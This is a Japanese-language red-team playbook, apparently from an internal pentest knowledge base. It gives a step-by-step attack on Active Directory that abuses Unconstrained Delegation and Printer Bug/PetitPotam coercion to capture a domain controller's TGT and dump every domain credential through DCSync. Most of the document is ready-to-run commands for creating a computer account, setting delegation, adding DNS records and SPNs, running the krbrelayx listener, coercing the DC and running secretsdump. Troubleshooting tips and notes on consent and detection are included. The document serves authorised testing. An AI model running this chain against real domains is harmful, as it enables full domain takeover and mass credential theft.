# Unconstrained Delegation + Printer Bug による TGT キャプチャ

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（Printer Bug 併用時に本番DCのスプーラーサービスへ影響）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（DNSレコード追加・SPN追加・コンピューターアカウント作成・Unconstrained Delegation 設定）
> - [x] SIEM/EDR で確実に検知される（Event ID 4769 / 4742 マシンアカウント変更 / 4741 マシンアカウント作成）
>
> 実施可否は事前合意で明示確認すること。追加した DNS レコード・SPN・コンピューターアカウントは原状回復必須。演習環境（HTB / OSCP 等）では制約なし。

## 概要

Unconstrained Delegation が設定されたコンピューターに対して認証してきたユーザーの TGT（チケット認証証明書）がメモリに保存される仕組みを利用する攻撃。Printer Bug（MS-RPRN）で DC を強制的に認証させることで、DC の TGT を取得し DCSync を実行する。

---

## 着火条件

以下の**すべて**が満たされている場合：

1. `SeEnableDelegationPrivilege` を持つユーザーの権限がある（Unconstrained Delegation を設定できる）
2. DC 上で Printer Spooler サービスが稼働している
3. DNS の書き込み権限がある（または既存アカウントに SPN を付与できる）

---

## 攻撃の原理

1. 攻撃側が Unconstrained Delegation を持つコンピューターアカウントを作成
2. そのコンピューターの DNS レコードと SPN を登録（DCが Kerberos 認証できるようにする）
3. krbrelayx でリスナーを起動（Kerberos TGT をキャプチャする）
4. Printer Bug (MS-RPRN) で DC に「自分の CIFS サービスに認証しろ」と強制
5. DC が Kerberos 認証を試みて TGT を送信 → キャプチャ
6. DC の TGT で DCSync

---

## 手順

### Step 1: 攻撃用コンピューターアカウントを作成

```bash
impacket-addcomputer \
  -computer-name 'ATTACKER$' \
  -computer-pass '[CLIENT_PROVIDED_PASSWORD]' \
  -dc-ip [DC_IP] -domain [DOMAIN] -method SAMR \
  '[DOMAIN]/[USER]:[PASSWORD]'
```

### Step 2: Unconstrained Delegation を設定

`SeEnableDelegationPrivilege` を持つユーザーの権限で設定する。実行環境に応じて以下から選ぶ。

**方法A: bloodyAD（攻撃側 Linux から実行。Windows シェル不要）**

```bash
# [Attacker] bloodyAD（別途インストール要: pip install bloodyAD --break-system-packages）
bloodyAD \
  -u '[USER]' -d '[DOMAIN]' -p '[PASSWORD]' \
  --host '[DC_IP]' \
  add uac 'ATTACKER$' -f TRUSTED_FOR_DELEGATION
```

出力に `['TRUSTED_FOR_DELEGATION'] property flags added to ATTACKER$'s userAccountControl` が出れば成功。

**方法B: PowerShell AD モジュール（Windows シェル内から実行）**

```powershell
# [Target] Windows シェル内。Active Directory モジュールが必要
Set-ADComputer ATTACKER$ -TrustedForDelegation $True
```

> **どちらを選ぶか：** Linux 攻撃側からリモートで設定できる方法 A が主流。Windows WinRM シェルが取れていても、DC 上に AD モジュールがない環境では方法 A の方が確実。

### Step 3: DNS レコードの追加

攻撃側マシンの IP を指す DNS レコードを登録する：
```bash
python3 /path/to/krbrelayx/dnstool.py \
  -u '[DOMAIN]\ATTACKER$' -p '[CLIENT_PROVIDED_PASSWORD]' \
  -r attacker.[DOMAIN] \
  -d [ATTACKER_IP] \
  --action add [DC_IP]
```

### Step 4: ATTACKER$ に SPN を追加

DC が Kerberos 認証できるように SPN を登録する：
```bash
python3 /path/to/krbrelayx/addspn.py \
  -u '[DOMAIN]\[USER]' -p '[PASSWORD]' \
  -s 'HOST/attacker.[DOMAIN]' \
  -t 'ATTACKER$' \
  [DC_IP]
```

### Step 5: krbrelayx でリスナーを起動

**事前準備（必須）： ATTACKER$ パスワードを NT ハッシュに変換する**

Kerberos 認証では平文パスワードでなく NT ハッシュが必要。以下のコマンドで変換する：

```bash
# [Attacker]
python3 -c "
import hashlib, binascii
password = '[CLIENT_PROVIDED_PASSWORD]'
nt_hash = binascii.hexlify(hashlib.new('md4', password.encode('utf-16-le')).digest()).decode()
print(nt_hash)
"
```

出力された 32 文字の hex 文字列が NT ハッシュ。次の `krbrelayx.py` の `-hashes :[NT_HASH]` に使う。

**重要:** バックグラウンド実行時に stdin が EOF になって即終了するため、`tail -f /dev/null` でパイプする。

```bash
# ATTACKER$ パスワードの NT ハッシュを計算
python3 -c "import hashlib; print(hashlib.new('md4', '[CLIENT_PROVIDED_PASSWORD]'.encode('utf-16-le')).hexdigest())"
# → NT ハッシュを取得

# リスナーを起動
tail -f /dev/null | python3 /path/to/krbrelayx/krbrelayx.py \
  -hashes :[NT_HASH] \
  -ip [ATTACKER_IP] \
  -l /tmp/loot \
  -f ccache \
  -dc-ip [DC_IP] &
```

### Step 6: DC を強制認証（Coercion）

DNS 伝搬を待つ必要がある（レコード追加後 **最大 180 秒**）。`dig attacker.[DOMAIN] @[DC_IP]` で A レコードが返ってきたら準備完了。

DC を強制的に攻撃側マシンへ認証させるツールを使う。使えるかどうかは DC のパッチ適用状況による。

**方法A: PetitPotam.py（MS-EFSRPC を利用）**

```bash
# [Attacker]  GitHub: https://github.com/topotam/PetitPotam
python3 PetitPotam.py \
  -target-ip [DC_IP] \
  -u '[MACHINE_ACCOUNT$]' -p '[MACHINE_ACCOUNT_PASSWORD]' \
  attacker.[DOMAIN] [DC_FQDN]
```

出力に `[+] Attack worked!` が出れば DC が認証を試みている。

**方法B: printerbug.py（MS-RPRN / Print Spooler を利用）**

```bash
# [Attacker]  GitHub: https://github.com/dirkjanm/krbrelayx/
python3 /path/to/krbrelayx/printerbug.py \
  '[DOMAIN]/[USER]@[DC_FQDN]' \
  attacker.[DOMAIN]
```

| 状況 | 選択 |
|------|------|
| Print Spooler が有効（`spoolss` が応答）| どちらでも可。方法 B が安定することが多い |
| Print Spooler が無効・パッチ済み | 方法 A（MS-EFSRPC は別のサービス） |
| どちらも応答しない | DC が coercion に対して強化済み → 別の攻撃経路を検討 |

成功すると krbrelayx リスナーに `Got ticket for DC1$@[DOMAIN] [krbtgt@[DOMAIN]]` が表示され、`.ccache` ファイルが保存される。

### Step 7: DC の TGT で DCSync

```bash
export KRB5CCNAME="/tmp/loot/DC1\$@[DOMAIN]_krbtgt@[DOMAIN].ccache"

impacket-secretsdump \
  -k -no-pass \
  -dc-ip [DC_IP] \
  'DC1$@[DC_FQDN]'
```

---

## トラブルシューティング

| 症状 | 原因・対処 |
|------|-----------|
| krbrelayx がすぐに終了する | `tail -f /dev/null \|` を先頭に追加してパイプする |
| DC が NTLM で接続してくる | ATTACKER$ に SPN が設定されていない → Step 4 を確認。`bloodyAD get object 'ATTACKER$' --attr servicePrincipalName` で確認できる |
| `printerbug` でログエラーが出る | impacket のバージョン互換性の問題。動作自体は正常なことが多い。PetitPotam に切り替えても可 |
| PetitPotam が `RPC_ACCESS_DENIED` を出して `[+] OK! Using unpatched function!` と続く | 正常動作。`EfsRpcOpenFileRaw` はパッチ済みだが別の関数で攻撃が成立している |
| DNS がまだ解決できない | Step 3 のレコード追加から最大 180 秒待つ。`dig attacker.[DOMAIN] @[DC_IP]` で確認 |
| `KRB_AP_ERR_SKEW` | 時刻のずれ → `sudo ntpdate [DC_IP]` |
| TRUSTED_FOR_DELEGATION が設定できない | `SeEnableDelegationPrivilege` が現在のユーザーに付与されているか `whoami /priv` で確認する |

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。本番DCのスプーラーサービスを巻き込む可能性があり、業務影響と検知リスクが大きい
- **想定されるSIEM/EDR検知**:
  - Event ID 4741（コンピューターアカウント作成）
  - Event ID 4742（コンピューターアカウント変更：TrustedForDelegation 属性の変更）
  - Event ID 4769（Kerberos サービスチケット要求）
  - DNS 動的更新ログ（攻撃側が追加したレコード）
  - Defender for Identity の Unconstrained Delegation アラート
- **業務影響リスク**: パフォーマンス低下／部分的サービス停止リスク（Printer Bug が本番DCのスプーラーに対してエラーを起こす可能性）
- **原状回復必須項目**:
  - ✅ 作成したコンピューターアカウント（`ATTACKER$` 等）の削除
  - ✅ 追加した DNS レコードの削除（`dnstool.py --action remove`）
  - ✅ 追加した SPN の削除（`addspn.py --remove`）
  - ✅ Unconstrained Delegation 属性のクリア（`Set-ADComputer -TrustedForDelegation $False`）
  - ✅ `/tmp/loot/` 配下にキャプチャしたチケットファイル（`.ccache`）の暗号化保管 → テスト完了時破棄
- **取得情報の取扱**: DC$ TGT は最高機密扱い。暗号化保管、テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術
- 関連：`./RBCD.md`（よりシンプルな委任攻撃として比較）
- 後：`../Credential_Dumping.md`（DC の TGT で DCSync を実行）
